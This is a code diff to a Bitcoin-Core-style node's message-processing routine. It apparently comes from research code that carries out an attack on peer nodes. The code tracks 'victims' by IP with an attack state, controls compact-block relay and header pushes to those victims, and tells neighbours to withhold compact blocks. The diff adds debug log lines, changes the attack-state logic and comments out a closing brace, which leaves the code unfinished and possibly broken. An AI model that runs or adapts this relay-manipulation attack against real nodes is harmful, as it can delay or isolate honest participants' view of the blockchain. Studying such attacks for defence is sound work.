@@ -1950,7 +1950,8 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
                     good_news = 1;
                     // add myself to the hb list
                     pvictimState->hb_list.insert(-1);
-                    pvictimState->attack_state = 2;
+		    //TODO: this should only be 1 for attack 1, for 2 it needs to be 2 again.
+                    pvictimState->attack_state = 1;
                     if (pvictimState->hb_list.size()==3 && pvictimState->attack_state != 1) {
                         pvictimState->attack_state = 1;
                         // now tell other neighbors that we don't want compact blocks
@@ -2472,6 +2473,7 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
          * Iterate through all victims and take actions for each victim depending on its attack state.
          */
         for (auto victim_it : connman->victim_states) {
+		LogPrintf("We have a victim\n");
             std::shared_ptr<VictimState> pvictimState = victim_it.second;
 
             std::string victim_ip_string = victim_it.first.substr(0, victim_it.first.find(":"));
@@ -2480,7 +2482,9 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
 
             if (pvictimState->attack_state == 0
                 && pvictimState->relayed_compact_blocks.find(cmpctblock.header.GetHash().ToString()) == pvictimState->relayed_compact_blocks.end()) {
+		    LogPrintf("Got to the first\n");
                 if (pvictim) {
+			LogPrintf("Got to the second\n");
                     connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::CMPCTBLOCK, cmpctblock));
                     pvictimState->relayed_compact_blocks[cmpctblock.header.GetHash().ToString()] = nullptr;
                     pvictimState->relayed_fast_headers[cmpctblock.header.GetHash().ToString()] = 0;
@@ -2489,7 +2493,9 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
                 }
             } else if (pvictimState->attack_state == 1
                        && pvictimState->getdata_request.find(cmpctblock.header.GetHash().ToString()) != pvictimState->getdata_request.end()) {
+		    LogPrintf("Got to the first 2\n");
                 if (pvictim) {
+			LogPrintf("Got to the second 2\n");
                     connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::CMPCTBLOCK, cmpctblock));
                     LogPrintf("VIC %s - sending a compact block to respond to its previous getdata request\n",
                               pvictim->addr.ToString());
@@ -2498,7 +2504,9 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
             } else if (pvictimState->attack_state == 1
                        && pvictimState->getdata_request.find(cmpctblock.header.GetHash().ToString()) == pvictimState->getdata_request.end()
                        && pvictimState->relayed_fast_headers.find(cmpctblock.header.GetHash().ToString()) == pvictimState->relayed_fast_headers.end()) {
+		    LogPrintf("Got to the first 3\n");
                 if (pvictim) {
+			LogPrintf("Got to the second 3\n");
                     // construct a headers message and send directly to the victim
                     std::vector <CBlock> headers_to_victim;
                     headers_to_victim.push_back(cmpctblock.header);
@@ -2704,7 +2712,7 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
             // Note that if a peer tries to build on an invalid chain, that
             // will be detected and the peer will be banned.
           //  return ProcessHeadersMessage(pfrom, connman, {cmpctblock.header}, chainparams, /*punish_duplicate_invalid=*/false);
-        }
+       // }
 	
     
         //if (fBlockReconstructed) {
